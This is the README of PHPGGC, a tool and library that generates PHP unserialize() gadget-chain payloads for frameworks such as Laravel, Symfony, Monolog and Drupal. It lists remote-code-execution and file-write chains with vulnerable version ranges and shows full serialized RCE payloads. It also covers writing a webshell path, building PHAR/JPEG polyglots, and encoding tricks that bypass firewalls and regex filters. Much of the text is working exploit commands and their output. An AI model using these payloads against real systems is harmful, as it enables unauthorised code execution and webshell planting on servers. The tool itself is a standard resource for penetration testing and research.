# PHPGGC: PHP Generic Gadget Chains

*PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically*.
When encountering an unserialize on a website you don't have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent of [frohoff's ysoserial](https://github.com/frohoff/ysoserial), but for PHP.
Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.


## Requirements

PHP >= 5.6 is required to run PHPGGC.


## Usage

Run `./phpggc -l` to obtain a list of gadget chains:

```
$ ./phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                              TYPE                   VECTOR         I    
Bitrix/RCE1                               17.x.x <= 22.0.300                                   RCE (Function call)    __destruct          
CakePHP/RCE1                              ? <= 3.9.6                                           RCE (Command)          __destruct          
CakePHP/RCE2                              ? <= 4.2.3                                           RCE (Function call)    __destruct          
CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                       File read              __toString     *    
CodeIgniter4/RCE1                         4.0.2 <= 4.0.3                                       RCE (Function call)    __destruct          
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                  RCE (Function call)    __destruct          
CodeIgniter4/RCE3                         4.0.4 <= 4.3.6                                       RCE (Function call)    __destruct          
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                           RCE (Function call)    __destruct          
CodeIgniter4/RCE5                         -4.1.3+                                              RCE (Function call)    __destruct          
CodeIgniter4/RCE6                         -4.1.3 <= 4.2.10+                                    RCE (Function call)    __destruct          
Doctrine/FW1                              ?                                                    File write             __toString     *    
Doctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5                       File write             __destruct     *    
Doctrine/RCE1                             1.5.1 <= 2.7.2                                       RCE (PHP code)         __destruct     *    
Doctrine/RCE2                             1.11.0 <= 2.3.2                                      RCE (Function call)    __destruct     *    
Dompdf/FD1                                1.1.1 <= ?                                           File delete            __destruct     *    
...
```

Filter gadget chains:

```
$ ./phpggc -l laravel

Gadget Chains
-------------

NAME             VERSION            TYPE                   VECTOR        I    
Laravel/RCE1     5.4.27             RCE (Function call)    __destruct         
Laravel/RCE10    5.6.0 <= 9.1.8+    RCE (Function call)    __toString         
Laravel/RCE2     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE3     5.5.0 <= 5.8.35    RCE (Function call)    __destruct    *    
Laravel/RCE4     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE5     5.8.30             RCE (PHP code)         __destruct    *    
Laravel/RCE6     5.5.* <= 5.8.35    RCE (PHP code)         __destruct    *    
Laravel/RCE7     ? <= 8.16.1        RCE (Function call)    __destruct    *    
Laravel/RCE8     7.0.0 <= 8.6.9+    RCE (Function call)    __destruct    *    
Laravel/RCE9     5.4.0 <= 9.1.8+    RCE (Function call)    __destruct         
```

Every gadget chain has:

- Name: Name of the framework/library
- Version: Version of the framework/library for which gadgets are for
- Type: Type of exploitation: RCE, File Write, File Read, Include...
- Vector: the vector to trigger the chain after the unserialize (`__destruct()`, `__toString()`, `offsetGet()`, ...)
- Informations: Other informations about the chain

Use `-i` to get detailed information about a chain:

```
$ ./phpggc -i symfony/rce1
Name           : Symfony/RCE1
Version        : 3.3
Type           : rce
Vector         : __destruct
Informations   : 
Exec through proc_open()

./phpggc Symfony/RCE1 <command>
```

For RCE gadgets, the executed command can have 3 formatting types depending on how the gadget works:
- RCE (Command): `./phpggc Symfony/RCE1 id`
- RCE (PHP code): `./phpggc Symfony/RCE2 'phpinfo();'`
- RCE (Function call): `./phpggc Symfony/RCE4 system id`

Once you have selected a chain, run `./phpggc <gadget-chain> [parameters]` to obtain the payload.
For instance, to obtain a payload for Monolog, you'd do:

```
$ ./phpggc monolog/rce1 assert 'phpinfo()'
O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:10:"phpinfo();";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}
```

For a file write using SwiftMailer, you'd do:

```
$ echo 'It works !' > /tmp/data
$ ./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
O:13:"Swift_Message":8:{...}
```


## Wrapper

The `--wrapper` (`-w`) option allows you to define a PHP file containing the following functions:

- `process_parameters(array $parameters)`: Called right **before** `generate()`, allows to change parameters
- `process_object(object $object)`: Called right **before** `serialize()`, allows to change the object
- `process_serialized(string $serialized)`: Called right **after** `serialize()`, allows to change the serialized string

For instance, if the vulnerable code looks like this:

```php
<?php
$data = unserialize($_GET['data']);
print $data['message'];
```

You could use a `__toString()` chain, wrapping it like so:

```php
<?php
# /tmp/my_wrapper.php
function process_object($object)
{
    return array(
        'message' => $object
    );
}
```

And you'd call phpggc like so:

```
$ ./phpggc -w /tmp/my_wrapper.php slim/rce1 system id
a:1:{s:7:"message";O:18:"Slim\Http\Response":2:{...}}
```


## PHAR(GGC)

### History

At BlackHat US 2018, @s_n_t released PHARGGC, a fork of PHPGGC which instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and as such can be used for various exploitation techniques (`file_exists`, `fopen`, etc.). The paper is [here](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf).

### Implementation

PHAR archives come in three different formats: **PHAR, TAR, and ZIP**. The three of them are supported by PHPGGC.
Polyglot files can be generated using `--phar-jpeg` (`-pj`). Other options are available (use `-h`).

### Examples

```
$ # Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar
$ ./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id
$ # Creates a PHAR file in the ZIP format and stores it in /tmp/z.zip.phar
$ ./phpggc -p zip -o /tmp/z.zip.phar monolog/rce1 system id
$ # Creates a polyglot JPEG/PHAR file from image /tmp/dummy.jpg and stores it in /tmp/z.zip.phar
$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id
```


## Encoders

Arguments allow to modify the way the payload is output. For instance, `-u` will URL encode it, and `-b` will convert it to base64.
**Payloads often contain NULL bytes and cannot be copy/pasted as-is**. Use `-s` for a soft URL encode, which keeps the payload readable.

The encoders can be chained, and as such **the order is important**. For instance, `./phpggc -b -u -u slim/rce1 system id` will base64 the payload, then URLencode it twice.


## Advanced: Enhancements

### Fast destruct

PHPGGC implements a `--fast-destruct` (`-f`) flag, that will make sure your serialized object will be destroyed right after the `unserialize()` call, and not at the end of the script. **I'd recommend using it for every `__destruct` vector**, as it improves reliability. For instance, if PHP script raises an exception after the call, the `__destruct` method of your object might not be called. As it is processed at the same time as encoders, it needs to be set first.

```
$ ./phpggc -f -s slim/rce1 system id
a:2:{i:7;O:18:"Slim\Http\Response":2:{s:10:"...
```

### ASCII Strings

Uses the `S` serialization format instead of the standard `s`. This replaces every non-ASCII char to an hexadecimal representation:
`s:5:"A<null_byte>B<cr><lf>";̀` -> `S:5:"A\00B\09\0D";`
This can be useful when for some reason non-ascii characters are not allowed (NULL BYTE for instance). Since payloads generally contain them, this makes sure that the payload consists only of ASCII values.
*Note: this is experimental and it might not work in some cases.*

### Armor Strings

Uses the `S` serialization format instead of the standard `s`. This replaces every char to an hexadecimal representation:
`s:5:"A<null_byte>B<cr><lf>";̀` -> `S:5:"\41\00\42\09\0D";`
This comes handy when a firewall or PHP code blocks strings.
*Note: this is experimental and it might not work in some cases.*
*Note: this makes each string in the payload grow by a factor of 3.*

### Plus Numbers

Sometimes, PHP scripts verify that the given serialized payload does not contain objects by using a regex such as `/O:[0-9]+:`. This is easily bypassed using `O:+123:...` instead of `O:123:`. One can use `--plus-numbers <types>`, or `-n <types>`, to automatically add these `+` signs in front of symbols.
For instance, to obfuscate objects and strings, one can use: `--n Os`. Please note that since PHP 7.2, only `i` and `d` (float) types can have a `+`.

### Testing your chain

To test if the gadget chain you want to use works in the targeted environment, jump to your environment's folder and run the chain argument-free, with the `--test-payload` option.

For instance, to test if `Monolog/RCE2` works on Symfony `4.x`:

```
$ composer create-project symfony/website-skeleton=4.x some_symfony
$ cd some_symfony
$ phpggc monolog/rce2 --test-payload
Trying to deserialize payload...
SUCCESS: Payload triggered !
```

The exit code will be `0` if the payload triggered, `1` otherwise.

### Testing your chain against every version of a package

If you wish to know which versions of a package a gadget chain works against, you can use `test-gc-compatibility.py`.

```
$ ./test-gc-compatibility.py monolog/monolog monolog/rce1 monolog/rce3
Testing 59 versions for monolog/monolog against 2 gadget chains.

┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓
┃ monolog/monolog ┃ Package ┃ monolog/rce1 ┃ monolog/rce3 ┃
┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩
│ 2.x-dev         │   OK    │      OK      │      KO      │
│ 2.3.0           │   OK    │      OK      │      KO      │
│ 2.2.0           │   OK    │      OK      │      KO      │
│ 2.1.1           │   OK    │      OK      │      KO      │
│ 2.1.0           │   OK    │      OK      │      KO      │
│ 2.0.2           │   OK    │      OK      │      KO      │
│ 2.0.1           │   OK    │      OK      │      KO      │
│ 2.0.0           │   OK    │      OK      │      KO      │
│ 2.0.0-beta2     │   OK    │      OK      │      KO      │
│ 2.0.0-beta1     │   OK    │      OK      │      KO      │
│ 1.x-dev         │   OK    │      OK      │      KO      │
│ 1.26.1          │   OK    │      OK      │      KO      │
│ 1.26.0          │   OK    │      OK      │      KO      │
│ 1.25.5          │   OK    │      OK      │      KO      │
│ 1.25.4          │   OK    │      OK      │      KO      │
                        ...
│ 1.0.1           │   OK    │      KO      │      KO      │
│ 1.0.0           │   OK    │      KO      │      KO      │
│ 1.0.0-RC1       │   OK    │      KO      │      KO      │
│ dev-main        │   OK    │      OK      │      KO      │
│ * dev-phpstan   │   OK    │      OK      │      KO      │
└─────────────────┴─────────┴──────────────┴──────────────┘
```

You can specify the versions you want to test by using the following syntaxe.

```
$ ./test-gc-compatibility.py monolog/monolog:2.3.0,1.25.4 monolog/rce1 monolog/rce3
Testing 2 versions for monolog/monolog against 2 gadget chains.

┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓
┃ monolog/monolog ┃ Package ┃ monolog/rce1 ┃ monolog/rce3 ┃
┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩
│ 2.3.0           │   OK    │      OK      │      KO      │
│ 1.25.4          │   OK    │      OK      │      KO      │
└─────────────────┴─────────┴──────────────┴──────────────┘
```

# API

Instead of using PHPGGC as a command line tool, you can program PHP scripts:

```php
<?php

# Include PHPGGC
include("phpggc/lib/PHPGGC.php");

# Include guzzle/rce1
$gc = new \GadgetChain\Guzzle\RCE1();

# Always process parameters unless you're doing something out of the ordinary
$parameters = $gc->process_parameters([
	'function' => 'system',
	'parameter' => 'id',
]);

# Generate the payload
$object = $gc->generate($parameters);

# Most (if not all) GC's do not use process_object and process_serialized, so
# for quick & dirty code you can omit those two 
$object = $gc->process_object($object);

# Serialize the payload
$serialized = serialize($object);
$serialized = $gc->process_serialized($serialized);

# Display it
print($serialized . "\n");

# Create a PHAR file from this payload
$phar = new \PHPGGC\Phar\Tar($serialized);
file_put_contents('output.phar.tar', $phar->generate());
```

This allows you to tweak the parameters or write exploits more easily.
*Note: This is pretty experimental at the moment, so please, report bugs*.


# Contributing

Pull requests are more than welcome. Please follow these simple guidelines:

- `__destruct()` is always the best vector
- Specify at least the version of the library you've built the payload on
- Do not include unused parameters in the gadget definition if they keep their default values. It just makes the payload bigger.
- Respect code style: for instance, opening brackets `{` are on a new line, and arrays should be written as `[1, 2, 3]` instead of the old, `array(1, 2, 3)`, notation.

Codewise, the directory structure is fairly straightforward: gadgets in _gadgets.php_, description + logic in _chain.php_.
You can define pre- and post- processing methods, if parameters need to be modified.
Hopefully, the already implemented gadgets should be enough for you to build yours.
Otherwise, I'd be glad to answer your questions.

Please test as many versions as you can. The nomenclature for versions is as such: `[-]<lower-version> <= <higher-version>[+]`. The `-` and `+` signs indicate that your payload may work on respectively lower and higher versions. For instance, if your gadget chain works from version 2.0.0 to version 4.4.1, which is the last version at the time, use `2.0.0 <= 4.4.1+`.

The `--new <framework> <type>` command-line option can be used to create the directory and file structure for a new gadget chain.
For instance, use `./phpggc -n Drupal RCE` would create a new Drupal RCE gadgetchain.


# Docker

If you don't want to install PHP, you can use `docker build . -t 'phpggc'`.

To generate a gadget chain.

```
$ docker run phpggc Monolog/rce1 'system' 'id'
O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}
```

To run `test-gc-compatibility.py` from docker.
```
$ docker run --entrypoint './test-gc-compatibility.py' phpggc doctrine/doctrine-bundle:2.2,2.7.2 doctrine/rce1 doctrine/rce2
Runing on PHP version ('PHP 8.1.13 (cli) (built: Nov 30 2022 21:53:44) (NTS).
Testing 2 versions for doctrine/doctrine-bundle against 2 gadget chains.

┏━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
┃ doctrine/doctrine-bundle ┃ Package ┃ doctrine/rce1 ┃ doctrine/rce2 ┃
┡━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩
│ 2.2                      │   OK    │      OK       │      OK       │
│ 2.7.2                    │   OK    │      OK       │      KO       │
└──────────────────────────┴─────────┴───────────────┴───────────────┘
```

# License

[Apache License 2.0](LICENSE)
